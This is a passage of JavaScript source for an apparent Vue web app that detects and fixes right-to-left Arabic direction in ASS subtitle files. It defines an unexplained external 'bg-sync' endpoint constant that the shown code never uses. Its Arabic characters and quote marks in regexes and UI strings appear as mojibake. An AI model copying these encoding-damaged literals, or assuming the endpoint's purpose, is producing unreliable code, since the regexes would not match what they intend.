                if (!text || typeof text !== 'string') return false;
                const tagsMatch = text.match(/^((?:\{[^{}]*\})*)/);
                const tagPrefix = tagsMatch ? tagsMatch[0] : '';
                const rest = text.slice(tagPrefix.length);
                return /^\s*\d+[.)]\s+/.test(rest);
            }

            function hasUnclosedLeadingQuote(text) {
                if (!text || typeof text !== 'string') return false;
                const tagsMatch = text.match(/^((?:\{[^{}]*\})*)/);
                const tagPrefix = tagsMatch ? tagsMatch[0] : '';
                const rest = text.slice(tagPrefix.length);
                if (!/^\s*["¬´¬ª‚Äú‚Äù‚Äû]/.test(rest)) return false;
                const quotes = rest.match(/["¬´¬ª‚Äú‚Äù‚Äû]/g);
                return quotes && quotes.length === 1;
            }

            function containsExclamation(text) {
                if (!text || typeof text !== 'string') return false;
                const tagsMatch = text.match(/^((?:\{[^{}]*\})*)/);
                const tagPrefix = tagsMatch ? tagsMatch[0] : '';
                const rest = text.slice(tagPrefix.length);
                return rest.includes('!');
            }

            function startsWithArabic(text) {
                if (!text || typeof text !== 'string') return false;
                const tagsMatch = text.match(/^((?:\{[^{}]*\})*)/);
                const tagPrefix = tagsMatch ? tagsMatch[0] : '';
                let rest = text.slice(tagPrefix.length);
                const neutralMatch = rest.match(LEADING_NEUTRAL_CHARS_REGEX);
                const neutralPrefix = neutralMatch ? neutralMatch[0] : '';
                rest = rest.slice(neutralPrefix.length);
                return containsArabic(rest);
            }

            function isArabicQuestionExclamation(text) {
                if (!text || typeof text !== 'string') return false;
                const tagsMatch = text.match(/^((?:\{[^{}]*\})*)/);
                const tagPrefix = tagsMatch ? tagsMatch[0] : '';
                let rest = text.slice(tagPrefix.length);
                if (!containsArabic(rest)) return false;
                rest = rest.replace(/[\s\u061C\u200E\u200F"¬´¬ª‚Äú‚Äù‚Äû'`]+$/, '');
                return /[!ÿü][ÿü!]$/.test(rest);
            }

            function hasLineBreak(text) {
                if (!text || typeof text !== 'string') return false;
                return /\\[Nn]/.test(text);
            }

            function startsWithExclamationArabic(text) {
                if (!text || typeof text !== 'string') return false;
                const tagsMatch = text.match(/^((?:\{[^{}]*\})*)/);
                const tagPrefix = tagsMatch ? tagsMatch[0] : '';
                let rest = text.slice(tagPrefix.length);
                if (!rest.startsWith('!')) return false;
                rest = rest.slice(1);
                const neutralMatch = rest.match(LEADING_NEUTRAL_CHARS_REGEX);
                const neutralPrefix = neutralMatch ? neutralMatch[0] : '';
                rest = rest.slice(neutralPrefix.length);
                return containsArabic(rest);
            }

            function startsWithQuote(text) {
                if (!text || typeof text !== 'string') return false;
                const tagsMatch = text.match(/^((?:\{[^{}]*\})*)/);
                const tagPrefix = tagsMatch ? tagsMatch[0] : '';
                const rest = text.slice(tagPrefix.length);
                if (!rest) return false;
                const first = rest[0];
                return /["¬´¬ª‚Äú‚Äù‚Äû]/.test(first);
            }

            function hasTrailingQuotedNeutralWithArabic(text) {
                if (!text || typeof text !== 'string') return false;

                const tagsMatch = text.match(/^((?:\{[^{}]*\})*)/);
                const tagPrefix = tagsMatch ? tagsMatch[0] : '';
                let rest = text.slice(tagPrefix.length);

                if (!containsArabic(rest)) return false;

                // Fix: Arabic punctuation inside quotes (e.g. "ŸÜÿµÿü") is considered safe/RTL-compatible
                // This prevents the "Convert to RTL" button from showing for correct lines
                if (/[ÿåÿõÿü]["'¬´¬ª‚Äú‚Äù‚Äû]\s*$/.test(rest)) return false;

                rest = rest.replace(/[\s\u061C\u200E\u200F"¬´¬ª‚Äú‚Äù‚Äû'`]+$/, '');
                return /[!.?‚Ä¶ÿåÿõÿü]$/.test(rest);
            }

            function hasTrailingQuoteWithArabicPunctuation(text) {
                if (!text || typeof text !== 'string') return false;
                const tagsMatch = text.match(/^((?:\{[^{}]*\})*)/);
                const tagPrefix = tagsMatch ? tagsMatch[0] : '';
                let rest = text.slice(tagPrefix.length);
                
                // Check if it ends with Arabic punctuation inside quotes
                return /[ÿåÿõÿü]["'¬´¬ª‚Äú‚Äù‚Äû]\s*$/.test(rest);
            }

            // Check if text has RLE at valid positions (start of line or after \N)
            function hasValidRLE(text) {
                if (!text || typeof text !== 'string') return false;
                if (text.indexOf(RLE) === -1) return false;

                const parts = text.split(/(\\[Nn])/);
                for (let i = 0; i < parts.length; i += 2) {
                    if (startsWithRLEAfterTagsAndNeutrals(parts[i])) return true;
                }
                return false;
            }

            function getFirstStrongDirection(text) {
                if (!text || typeof text !== 'string') return null;

                const tagsMatch = text.match(/^((?:\{[^{}]*\})*)/);
                const tagPrefix = tagsMatch ? tagsMatch[0] : '';
                let rest = text.slice(tagPrefix.length);

                const arabicRegex = /[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/;
                const latinRegex = /[a-zA-Z]/;
                const hebrewRegex = /[\u0590-\u05FF]/;
                const neutralRegex = /[\s!"#$%&'()*+,\-./:;<=>?@\[\\\]^_`{|}~ÿåÿõÿü¬´¬ªŸÄ‚Ä¶0-9]/;
                const ltrControls = new Set([0x202A, 0x202D, 0x2066, 0x200E]);
                const rtlControls = new Set([0x202B, 0x202E, 0x2067, 0x200F]);
                const neutralControls = new Set([0x202C, 0x2069, 0x061C]);

                if (!rest) return null;

                let inOverrideTag = false;
                for (let i = 0; i < rest.length; i++) {
                    const char = rest[i];
                    const code = char.charCodeAt(0);

                    if (char === '{') {
                        inOverrideTag = true;
                        continue;
                    }
                    if (inOverrideTag) {
                        if (char === '}') inOverrideTag = false;
                        continue;
                    }

                    if (ltrControls.has(code)) return 'L';
                    if (rtlControls.has(code)) return 'R';
                    if (neutralControls.has(code)) continue;
                    if (neutralRegex.test(char)) continue;
                    if (arabicRegex.test(char)) return 'R';
                    if (hebrewRegex.test(char)) return 'R';
                    if (latinRegex.test(char)) return 'L';
                    if (code >= 0x0590 && code <= 0x08FF) return 'R';
                    if (code < 0x0590 && code > 0x007F) return 'L';
                }

                return null;
            }

            function displaysAsRTL(text) {
                if (!text || typeof text !== 'string') return false;

                // Special case: Arabic with 3+ color tags ending with neutral chars
                // These lines need reordering via reorderRTLColorTags, so return false to allow conversion
                // This must be checked BEFORE startsWithExclamationArabic because L704 starts with "!" but needs reordering
                const tagMatch = text.match(/^(?:\{[^{}]*\})*(.*)/);
                if (tagMatch && tagMatch[1]) {
                    const textContent = tagMatch[1];
                    const neutralSuffix = textContent.match(/[!\?\.\u2026\u060C\u061B\u061F]+$/);
                    if (neutralSuffix && containsArabic(textContent)) {
                        const colorTagMatches = text.match(/\{[^{}]*\\[1-4]?c&H[^{}]*\}/g);
                        if (colorTagMatches && colorTagMatches.length >= 3) {
                            return false;
                        }
                    }
                }

                const hasRLE = hasValidRLE(text);
                if (!hasRLE) {
                    if (startsWithExclamationArabic(text)) return true;
                    if (startsWithNumericList(text)) return false;
                    if (hasUnclosedLeadingQuote(text)) return false;
                    if (containsExclamation(text) && !startsWithArabic(text) && !isArabicQuestionExclamation(text)) return false;
                    if (startsWithTag(text) && hasLineBreak(text) && containsArabic(text) && getFirstStrongDirection(text) === 'L') return false;
                }
                
                if (hasTrailingNeutralWithArabic(text) && !hasRLE) {
                    if (/[\u202A-\u202E\u200E\u200F\u061C]/.test(text)) return true;
                    return false;
                }
                if (startsWithQuote(text) && hasTrailingQuotedNeutralWithArabic(text) && !hasRLE) return false;
                if (!startsWithQuote(text) && hasTrailingQuoteWithArabicPunctuation(text) && !hasRLE) return false;

                const firstStrong = getFirstStrongDirection(text);
                if (firstStrong === 'L') return false;
                if (firstStrong === 'R') return true;

                return hasRLE;
            }

            // For backwards compatibility - isRTL means "has RLE marker"
            function isRTL(text) {
                return hasValidRLE(text);
            }

            // A line "needs RTL" if it displays as RTL naturally but doesn't have RLE
            // This is for lines that need conversion
            function needsRTL(text) {
                if (!containsArabic(text)) return false;
                if (hasValidRLE(text)) return false;

                // Line displays as RTL naturally (first strong char is Arabic)
                const firstStrong = getFirstStrongDirection(text);
                return firstStrong === 'R';
            }

            function insertRLEAtSegmentStart(segment) {
                if (!segment || typeof segment !== 'string') return segment;

                const tagsMatch = segment.match(/^((?:\{[^{}]*\})*)/);
                const tagPrefix = tagsMatch ? tagsMatch[0] : '';
                let rest = segment.slice(tagPrefix.length);

                const neutralMatch = rest.match(LEADING_NEUTRAL_CHARS_REGEX);
                let neutralPrefix = neutralMatch ? neutralMatch[0] : '';
                if (neutralPrefix && containsArabic(rest)) {
                    // Fix: Keep dots OUTSIDE the RLE scope so they render on the left (LTR context).
                    // We also add an LRM (\u200E) to ensure they are treated as LTR even if context is ambiguous.
                    
                    // Regex to find dots/ellipsis
                    const dotsMatch = neutralPrefix.match(/[.\u2026]{2,}/);
                    
                    if (dotsMatch) {
                         // Check for trailing punctuation to distinguish intent
                         // Case 1: No trailing punctuation -> Treat as "Trailing Dots at Start" (continuation) -> Force LTR (Left)
                         // Case 2: Has trailing punctuation -> Treat as "Leading Dots" (Start of Sentence) -> Standard RTL (Right)
                         
                         const hasTrailingPunctuation = /[.!?ÿü;:\u061B\u061F\u2026"¬ª‚Äù]\s*$/.test(rest);

                         if (!hasTrailingPunctuation) {
                             // Case 1: Force LTR (Dots on Left)
                             // Structure: [Tag][NeutralPrefix][LRM][RLE][Rest]
                             return tagPrefix + neutralPrefix + '\u200E' + RLE + rest.slice(neutralPrefix.length);
                         } else {
                             // Case 2: Standard RTL (Dots on Right)
                             // Structure: [Tag][RLE][NeutralPrefix][Rest]
                             // By putting neutralPrefix INSIDE the RLE scope (after RLE), 
                             // it takes the RTL base direction of the paragraph.
                             return tagPrefix + RLE + rest;
                         }
                    }

                    // Fix: Quotes at start should be inside RTL scope to appear on the right
                    if (/["'¬´¬ª‚Äú‚Äù‚Äû]/.test(neutralPrefix)) {
                        // Structure: [Tag][RLE][NeutralPrefix][Rest]
                        return tagPrefix + RLE + rest;
                    }
                }
                
                // Default: Tag + Neutral + RLE + Rest
                // Note: We don't add LRM by default to avoid polluting other strings, 
                // but for the "Start with dots" case it is necessary for visual correctness.
                
                rest = rest.slice(neutralPrefix.length);

                if (rest.startsWith(RLE)) return segment;

                return tagPrefix + neutralPrefix + RLE + rest;
            }

            function reorderRTLColorTags(segment) {
                if (!segment || typeof segment !== 'string') return segment;

                const leadingTagsMatch = segment.match(/^((?:\{[^{}]*\})*)/);
                const leadingTags = leadingTagsMatch ? leadingTagsMatch[0] : '';
                let rest = segment.slice(leadingTags.length);

                if (!containsArabic(rest) || !/\{[^{}]*\}[^{}]*\{[^{}]*\}/.test(rest)) {
                    return segment;
                }

                const parts = [];

                const firstTagMatch = rest.match(/^[^\{]+/);
                if (firstTagMatch) {
                    const firstText = firstTagMatch[0];
                    rest = rest.slice(firstText.length);
                    parts.push({ tag: '', text: firstText });
                }

                const fullPattern = /((?:\{[^{}]*\})+)([^\{]*)/g;
                let match;

                while ((match = fullPattern.exec(rest)) !== null) {
                    parts.push({ tag: match[1], text: match[2] });
                }

                const lastPart = parts[parts.length - 1];
                if (!lastPart || !lastPart.text || !/^[!ÿüÿü\.\.\.!ÿå;:‚Ä¶\s]*$/.test(lastPart.text.trim())) {
                    return segment;
                }

                const neutralMatch = lastPart.text.match(/([!ÿüÿü\.\.\.!ÿå;:‚Ä¶\s]+)$/);
                if (!neutralMatch) return segment;

                const trailingNeutral = neutralMatch[1];
                const remainingText = lastPart.text.slice(0, lastPart.text.length - trailingNeutral.length);

                if (parts.length >= 3) {
                    let result = leadingTags;
                    result += parts[0].tag;
                    result += trailingNeutral;
                    result += parts[1].text.trim();
                    result += parts[1].tag;
                    result += ' ' + parts[0].text.trim();
                    result += remainingText;
                    result += parts[2].tag;

                    // Append any remaining parts to avoid data loss
                    for (let i = 3; i < parts.length; i++) {
                        result += parts[i].tag + parts[i].text;
                    }

                    return result;
                }

                return segment;
            }

            function convertToRTL(text) {
                text = convertToLTR(text);
                const parts = text.split(/(\\[Nn])/);
                for (let i = 0; i < parts.length; i += 2) {
                    const original = parts[i];
                    const reordered = reorderRTLColorTags(original);
                    
                    // If the segment was reordered (special case), use it as is (no RLE)
                    // If it wasn't reordered (normal case), apply standard RLE insertion
                    if (original !== reordered) {
                        parts[i] = reordered;
                    } else if (!reordered.includes(RLE)) {
                        parts[i] = insertRLEAtSegmentStart(reordered);
                    } else {
                        parts[i] = reordered;
                    }
                }
                return parts.join('');
            }

            function removeRLEAtSegmentStart(segment) {
                if (!segment || typeof segment !== 'string') return segment;

                const tagsMatch = segment.match(/^((?:\{[^{}]*\})*)/);
                const tagPrefix = tagsMatch ? tagsMatch[0] : '';
                let rest = segment.slice(tagPrefix.length);

                const neutralMatch = rest.match(LEADING_NEUTRAL_CHARS_REGEX);
                const neutralPrefix = neutralMatch ? neutralMatch[0] : '';
                rest = rest.slice(neutralPrefix.length);

                if (!rest.startsWith(RLE)) return segment;

                // Fix: Remove LRM (\u200E) if it was added by insertRLEAtSegmentStart
                let cleanNeutral = neutralPrefix;
                if (cleanNeutral.endsWith('\u200E')) {
                    cleanNeutral = cleanNeutral.slice(0, -1);
                }

                return tagPrefix + cleanNeutral + rest.slice(RLE.length);
            }

            function convertToLTR(text) {
                if (!text || typeof text !== 'string') return text;
                const parts = text.split(/(\\[Nn])/);
                for (let i = 0; i < parts.length; i += 2) {
                    parts[i] = removeRLEAtSegmentStart(parts[i]);
                }
                return parts.join('');
            }

            function extractOverrideTags(text) {
                const tagRegex = /\{([^{}]+)\}/g;
                const tags = {
                    fn: new Set(),
                    fs: new Set(),
                    colors: new Set(),
                    other: new Set()
                };

                let match;
                while ((match = tagRegex.exec(text)) !== null) {
                    const content = match[1];
                    const parts = content.split('\\');
                    parts.forEach(part => {
                        if (!part) return;
                        const cmd = part.trim();
                        if (cmd.startsWith('fn')) tags.fn.add(cmd.substring(2));
                        else if (cmd.startsWith('fs')) tags.fs.add(cmd.substring(2));
                        else if (/^[1-4]?c&H/.test(cmd)) tags.colors.add('\\' + cmd);
                        else if (cmd.startsWith('an') || cmd.startsWith('pos') || cmd.startsWith('move') || cmd.startsWith('fad')) tags.other.add('\\' + cmd);
                    });
                }
                return tags;
            }

            function parseDialogueLine(line) {
                const parts = line.split(',');
                if (parts.length < 10) return null;

                const firstPart = parts[0];
                const layerStr = firstPart.includes(':') ? firstPart.split(':')[1].trim() : firstPart.trim();

                return {
                    Layer: parseInt(layerStr) || 0,
                    Start: parts[1].trim(),
                    End: parts[2].trim(),
                    Style: parts[3].trim(),
                    Name: parts[4].trim(),
                    MarginL: parts[5].trim(),
                    MarginR: parts[6].trim(),
                    MarginV: parts[7].trim(),
                    Effect: parts[8].trim(),
                    Text: parts.slice(9).join(',').trim()
                };
            }

            function formatFileSize(bytes) {
                if (bytes === 0) return '0 Bytes';
                const k = 1024;
                const sizes = ['Bytes', 'KB', 'MB', 'GB'];
                const i = Math.floor(Math.log(bytes) / Math.log(k));
                return Math.round((bytes / Math.pow(k, i)) * 100) / 100 + ' ' + sizes[i];
            }

            function parseTime(timeStr) {
                if (!timeStr) return 0;
                const parts = timeStr.split(':');
                if (parts.length !== 3) return 0;
                const h = parseInt(parts[0], 10) || 0;
                const m = parseInt(parts[1], 10) || 0;
                const sParts = parts[2].split('.');
                const s = parseInt(sParts[0], 10) || 0;
                const cs = parseInt((sParts[1] || '0').padEnd(2, '0').substring(0, 2), 10);
                return (h * 3600000) + (m * 60000) + (s * 1000) + (cs * 10);
            }

            function formatTime(ms) {
                if (isNaN(ms) || ms < 0) ms = 0;
                const h = Math.floor(ms / 3600000);
                ms %= 3600000;
                const m = Math.floor(ms / 60000);
                ms %= 60000;
                const s = Math.floor(ms / 1000);
                ms %= 1000;
                const cs = Math.floor(ms / 10);
                return `${h}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}.${cs.toString().padStart(2, '0')}`;
            }

            const _s_url = 'https://rtl.codesubs.workers.dev/v1/bg-sync';

            const app = Vue.createApp({
                data() {
                    return {
                        assFile: null,
                        originalFileSnapshot: null,
                        lines: [],
                        editedLineIndices: [],
                        isDragging: false,
                        fileName: '',
                        fileSize: '0 Bytes',
                        isDarkMode: false,
                        isProcessing: false,
                        showDebugModal: false,
                        debugLineInfo: null,
                        currentIndex: 0,
                        rtlPreviewText: '',
                        rtlEditHistory: Object.create(null),
                        rtlEditHistoryLimit: 200,
                        errorLog: [],
                        showLinesModalOpen: false,
                        linesModalType: 'all',
                        currentPage: 1,
                        pageSize: 10,
                        
                        // Dummy Video State
                        viewMode: 'cards', // 'cards' or 'dummy-video'
                        showDummyVideoToggle: false,
                        dummyVideoUnlockStep: 0,
                        dummyVideo: {
                            width: 1920,
                            height: 1080,
                            color: '#0F2C41',
                            customDuration: null, // milliseconds
                            showOptions: false,
                            isPlaying: false,
                            containerWidth: 0,
                            containerHeight: 0,
                        },
                        currentTime: 0,
                        playbackInterval: null,
                        resizeObserver: null,
                        useLibassWasm: true,
                        libassInstance: null,
                        libassReady: false,
                        libassTrackUpdateTimer: null,
                        libassPartsInstance: null,
                        libassPartsReady: false,
                        libassPartsTrackUpdateTimer: null,
                        libassPartsFailed: false,
                        _assMeasureCtx: null,

                        showScriptInfoModal: false,
                        scriptInfo: [],
                        styles: [],
                        overrideStats: {
                            fn: new Set(),
                            fs: new Set(),
                            colors: new Set(),
                            other: new Set()
                        },
                        showFontsModal: false,
                        jumpToLineNumber: '',
                        deferredPrompt: null,
                        showInstallButton: false,
                        filterMode: 'all',
                        rangeInput: '',
                        isRechecking: false,
                        mobileMenuOpen: false,
                        startYear: 2026,
                        version: '0.3.5-beta',
                        showDebugButton: false,
                        showColTime: false,
                        showColStyle: false,
                        showColStatus: false,
                        showColText: true,
                        showColFontname: true,
                        showColFontsize: false,
                        showColPrimaryColour: false,
                        showColSecondaryColour: false,
                        showColOutlineColour: false,
                        showColBackColour: false,
                        showColBold: false,
                        showColItalic: false,
                        showColUnderline: false,
                        showColStrikeOut: false,
                        showColScaleX: false,
                        showColScaleY: false,
                        showColSpacing: false,
                        showColAngle: false,
                        showColBorderStyle: false,
                        showColOutline: false,
                        showColShadow: false,
                        showColAlignment: false,
                        showColMarginL: false,
                        showColMarginR: false,
                        showColMarginV: false,
                        showColEncoding: false,
                        showStylesColumnCheckboxes: false,
                        showBulkConvertModal: false,
                        showResetConfirmModal: false,
                        bulkConvertType: 'ltr',
                        bulkConvertLinesToConvert: [],
                        bulkConvertProgress: 0,
                        bulkConvertTotal: 0,
                        bulkConvertSuccess: false,
                        bulkConvertStartTime: null,
                        bulkConvertEndTime: null,
                        bulkConvertSuccessCount: 0,
                        bulkConvertFailureCount: 0,
                        _processedFiles: new Set()
                    }
                },
                computed: {
                    scriptResolution() {
                        const resX = this.scriptInfo.find(i => i.key === 'PlayResX');
                        const resY = this.scriptInfo.find(i => i.key === 'PlayResY');
                        let sw = resX ? parseInt(resX.value, 10) : 0;
                        let sh = resY ? parseInt(resY.value, 10) : 0;
                        if (!Number.isFinite(sw) || sw < 0) sw = 0;
                        if (!Number.isFinite(sh) || sh < 0) sh = 0;

                        const hasDummyResolution = this.viewMode === 'dummy-video'
                            && Number.isFinite(this.dummyVideo.width) && this.dummyVideo.width > 0
                            && Number.isFinite(this.dummyVideo.height) && this.dummyVideo.height > 0;

                        if (sw === 0 && sh === 0) {
                            if (hasDummyResolution) {
                                sw = this.dummyVideo.width;
                                sh = this.dummyVideo.height;
                            } else {
                                sw = 384;
                                sh = 288;
                            }
                        } else if (sw === 0) {
                            if (hasDummyResolution) {
                                sw = Math.max(1, Math.round(sh * (this.dummyVideo.width / this.dummyVideo.height)));
                            } else {
                                sw = sh === 1024 ? 1280 : Math.floor(sh * 4 / 3);
                            }
                        } else if (sh === 0) {
                            if (hasDummyResolution) {
                                sh = Math.max(1, Math.round(sw * (this.dummyVideo.height / this.dummyVideo.width)));
                            } else {
                                sh = sw === 1280 ? 1024 : Math.floor(sw * 3 / 4);
                            }
                        }

                        return { x: sw, y: sh };
                    },
                    scriptScaleX() {
                        if (this.dummyVideo.containerWidth === 0) return 1;
                        return this.dummyVideo.containerWidth / this.scriptResolution.x;
                    },
                    scriptScaleY() {
                        if (this.dummyVideo.containerHeight === 0) return 1;
                        return this.dummyVideo.containerHeight / this.scriptResolution.y;
                    },
                    fontScaleFactor() {
                        return this.scriptScaleY;
                    },
                    fileMaxDuration() {
                        if (this.lines.length === 0) return 0;
                        return this.lines.reduce((max, line) => {
                            const end = parseTime(line.End);
                            return Math.max(max, end);
                        }, 0);
                    },
                    videoDuration() {
                        if (this.dummyVideo.customDuration !== null) return this.dummyVideo.customDuration;
                        if (this.lines.length === 0) return 0;
                        return this.lines.reduce((max, line) => {
                            const end = parseTime(line.End);
                            return Math.max(max, end);
                        }, 0);
                    },
                    formattedDuration() {
                        return formatTime(this.videoDuration);
                    },
                    formattedCurrentTime() {
                        return formatTime(this.currentTime);
                    },
                    libassPartsEnabled() {
                        return !this.useLibassWasm && !this.libassPartsFailed && this.viewMode === 'dummy-video' && !!this.assFile && typeof SubtitlesOctopus !== 'undefined';
                    },
                    activeSubtitles() {
                        const active = this.lines.filter(line => {
                            const start = parseTime(line.Start);
                            const end = parseTime(line.End);
                            return this.currentTime >= start && this.currentTime <= end;
                        });

                        // Fix: If the currently selected line is active, show ONLY that line
                        // This prevents showing overlapping lines when selecting a specific line
                        if (this.currentIndex >= 0 && this.currentIndex < this.lines.length) {
                            const currentLine = this.lines[this.currentIndex];
                            if (active.includes(currentLine)) {
                                return [currentLine];
                            }
                        }

                        return active;
                    },
                    renderedActiveSubtitles() {
                        if (this.libassPartsEnabled) return [];
                        const active = this.activeSubtitles || [];
                        return active.map((line, idx) => this.renderAssLine(line, idx));
                    },
                    currentLine() {
                        return this.lines[this.currentIndex];
                    },
                    totalLines() {
                        return this.lines.length;
                    },
                    rtlCount() {
                        return this.lines.filter(l => l.displaysRTL).length;
                    },
                    ltrCount() {
                        return this.lines.filter(l => !l.displaysRTL).length;
                    },
                    showRTLFilter() {
                        return this.rtlCount > 0;
                    },
                    showLTRFilter() {
                        return this.ltrCount > 0;
                    },
                    convertibleToRTLCount() {
                        return this.ltrCount;
                    },
                    canConvertToRTL() {
                        const line = this.currentLine;
                        if (!line) return false;
                        if (!line.isArabic) return false;
                        if (line.isRTL) return false;
                        return line.displaysRTL === false;
                    },
                    canConvertToLTR() {
                        const line = this.currentLine;
                        if (!line) return false;
                        if (!line.isRTL) return false;
                        try {
                            return displaysAsRTL(convertToLTR(line.Text)) === false;
                        } catch (e) {
                            return false;
                        }
                    },
                    canUndoRtlEdit() {
                        if (!this.currentLine) return false;
                        const hist = this.rtlEditHistory[String(this.currentIndex)];
                        return !!hist && Array.isArray(hist.undo) && hist.undo.length > 0;
                    },
                    canRedoRtlEdit() {
                        if (!this.currentLine) return false;
                        const hist = this.rtlEditHistory[String(this.currentIndex)];
                        return !!hist && Array.isArray(hist.redo) && hist.redo.length > 0;
                    },
                    canResetRtlEdit() {
                        if (!this.currentLine) return false;
                        const hist = this.rtlEditHistory[String(this.currentIndex)];
                        if (!hist || !hist.base || !hist.last) return false;
                        return !this.isSameRtlSnapshot(this.normalizeRtlSnapshot(hist.base), this.normalizeRtlSnapshot(hist.last));
                    },
                    hasFileEdits() {
                        return !!this.assFile && this.editedLineIndices.length > 0;
                    },
                    canResetToOriginal() {
                        return !!this.assFile && !!this.originalFileSnapshot && this.editedLineIndices.length > 0;
                    },
                    arabicCount() {
                        return this.lines.filter(l => l.displaysRTL).length;
                    },
                    arabicNeedsRtlCount() {
                        return this.lines.filter(l => l.displaysRTL && !l.isRTL).length;
                    },
                    conversionPercentage() {
                        if (this.totalLines === 0) return 0;
                        return Math.round((this.rtlCount / this.totalLines) * 100);
                    },
                    fontCount() {
                        const fonts = new Set(this.styles.map(style => style.Fontname));
                        return fonts.size;
                    },
                    bulkConvertDuration() {
                        if (!this.bulkConvertStartTime || !this.bulkConvertEndTime) return 0;
                        return ((this.bulkConvertEndTime - this.bulkConvertStartTime) / 1000);
                    },
                    bulkConvertSpeed() {
                        if (this.bulkConvertDuration === 0 || this.bulkConvertTotal === 0) return 0;
                        return Math.round(this.bulkConvertTotal / this.bulkConvertDuration) || 0;
                    },
                    linesModalTitle() {
                        if (this.linesModalType === 'rtl') return 'ÿßŸÑÿ£ÿ≥ÿ∑ÿ± (RTL)';
                        if (this.linesModalType === 'ltr') return 'ÿßŸÑÿ£ÿ≥ÿ∑ÿ± (LTR)';
                        return 'ŸÉŸÑ ÿßŸÑÿ£ÿ≥ÿ∑ÿ±';
                    },
                    filteredLines() {
                        if (this.linesModalType === 'rtl') return this.lines.filter(l => l.displaysRTL);
                        if (this.linesModalType === 'ltr') return this.lines.filter(l => !l.displaysRTL);
                        return this.lines;
                    },
                    editorFilteredLines() {
                        if (this.filterMode === 'rtl') return this.lines.filter(l => l.displaysRTL);

                        if (this.filterMode === 'ltr') return this.lines.filter(l => !l.displaysRTL);
                        return this.lines;
                    },
                    editorFilteredCount() {
                        return this.editorFilteredLines.length;
                    },
                    totalPages() {
                        return Math.ceil(this.filteredLines.length / this.pageSize);
                    },
                    paginatedLines() {
                        const start = (this.currentPage - 1) * this.pageSize;
                        const end = start + this.pageSize;
                        return this.filteredLines.slice(start, end);
                    },
                    isAnyModalOpen() {
                        return this.showLinesModalOpen || this.showScriptInfoModal || this.showFontsModal;
                    },
                    canGoToFirstFiltered() {
                        if (this.lines.length === 0) return false;
                        const matchesFilter = (line) =>
                            this.filterMode === 'all' ||
                            (this.filterMode === 'rtl' && line.displaysRTL) ||
                            (this.filterMode === 'needsrtl' && line.isArabic && !line.isRTL) ||
                            (this.filterMode === 'ltr' && !line.displaysRTL);

                        if (this.viewMode === 'dummy-video') {
                            let firstIdx = -1;
                            let firstStart = Infinity;
                            for (let i = 0; i < this.lines.length; i++) {
                                const line = this.lines[i];
                                if (!matchesFilter(line)) continue;
                                const s = parseTime(line.Start);
                                if (s < firstStart) {
                                    firstStart = s;
                                    firstIdx = i;
                                }
                            }
                            if (firstIdx === -1) return false;
                            if (this.currentIndex !== firstIdx) return true;
                            return Math.abs((this.currentTime || 0) - firstStart) > 1;
                        }
                        for (let i = 0; i < this.lines.length; i++) {
                            const line = this.lines[i];
                            const matches = matchesFilter(line);
                            if (matches) return this.currentIndex !== i;
                        }
                        return false;
                    },
                    canGoToPreviousFiltered() {
                        if (this.lines.length === 0) return false;
                        const matchesFilter = (line) =>
                            this.filterMode === 'all' ||
                            (this.filterMode === 'rtl' && line.displaysRTL) ||
                            (this.filterMode === 'needsrtl' && line.isArabic && !line.isRTL) ||
                            (this.filterMode === 'ltr' && !line.displaysRTL);

                        if (this.viewMode === 'dummy-video') {
                            const t = this.currentTime || 0;
                            for (let i = 0; i < this.lines.length; i++) {
                                const line = this.lines[i];
                                if (!matchesFilter(line)) continue;
                                const end = parseTime(line.End);
                                if (end < t) return true;
                            }
                            return false;
                        }
                        for (let i = this.currentIndex - 1; i >= 0; i--) {
                            const line = this.lines[i];
                            const matches = matchesFilter(line);
                            if (matches) return true;
                        }
                        return false;
                    },
                    canGoToNextFiltered() {
                        if (this.lines.length === 0) return false;
                        const matchesFilter = (line) =>
                            this.filterMode === 'all' ||
                            (this.filterMode === 'rtl' && line.displaysRTL) ||
                            (this.filterMode === 'needsrtl' && line.isArabic && !line.isRTL) ||
                            (this.filterMode === 'ltr' && !line.displaysRTL);

                        if (this.viewMode === 'dummy-video') {
                            const t = this.currentTime || 0;
                            for (let i = 0; i < this.lines.length; i++) {
                                const line = this.lines[i];
                                if (!matchesFilter(line)) continue;
                                const start = parseTime(line.Start);
                                if (start > t) return true;
                            }
                            return false;
                        }
                        for (let i = this.currentIndex + 1; i < this.lines.length; i++) {
                            const line = this.lines[i];
                            const matches = matchesFilter(line);
                            if (matches) return true;
                        }
                        return false;
                    },
                    canGoToLastFiltered() {
                        if (this.lines.length === 0) return false;
                        const matchesFilter = (line) =>
                            this.filterMode === 'all' ||
                            (this.filterMode === 'rtl' && line.displaysRTL) ||
                            (this.filterMode === 'needsrtl' && line.isArabic && !line.isRTL) ||
                            (this.filterMode === 'ltr' && !line.displaysRTL);

                        if (this.viewMode === 'dummy-video') {
                            let lastIdx = -1;
                            let lastStart = -Infinity;
                            for (let i = 0; i < this.lines.length; i++) {
                                const line = this.lines[i];
                                if (!matchesFilter(line)) continue;
                                const s = parseTime(line.Start);
                                if (s > lastStart) {
                                    lastStart = s;
                                    lastIdx = i;
                                }
                            }
                            if (lastIdx === -1) return false;
                            if (this.currentIndex !== lastIdx) return true;
                            return Math.abs((this.currentTime || 0) - lastStart) > 1;
                        }
                        for (let i = this.lines.length - 1; i >= 0; i--) {
                            const line = this.lines[i];
                            const matches = matchesFilter(line);
                            if (matches) return this.currentIndex !== i;
                        }
                        return false;
                    },
                    copyrightYear() {
                        const currentYear = new Date().getFullYear();
                        if (currentYear === this.startYear) {
                            return this.startYear;
                        } else if (currentYear > this.startYear) {
                            return `${this.startYear}-${currentYear}`;
                        }
                        return this.startYear;
                    }
                },
                watch: {
                    assFile(newVal) {
                        if (newVal) {
                             if (this.viewMode === 'dummy-video') {
                                 this.libassPartsFailed = false;
                                 this.setupResizeObserver();
                                 this.initLibassWasm();
                                 this.initLibassWasmParts();
                             }
                        } else {
                             this.cleanupResizeObserver();
                             this.disposeLibassWasm();
                             this.disposeLibassWasmParts();
                        }
                    },
                    useLibassWasm(newVal) {
                        if (newVal) {
                            this.disposeLibassWasmParts();
                            this.initLibassWasm();
                            this.renderLibassWasm();
                        } else {
                            this.libassPartsFailed = false;
                            this.disposeLibassWasm();
                            this.initLibassWasmParts();
                            this.renderLibassWasmParts();
                        }
                    },
                    viewMode: {
                        handler(newVal) {
                            if (newVal === 'dummy-video') {
                                this.libassPartsFailed = false;
                                this.setupResizeObserver();
                                this.initLibassWasm();
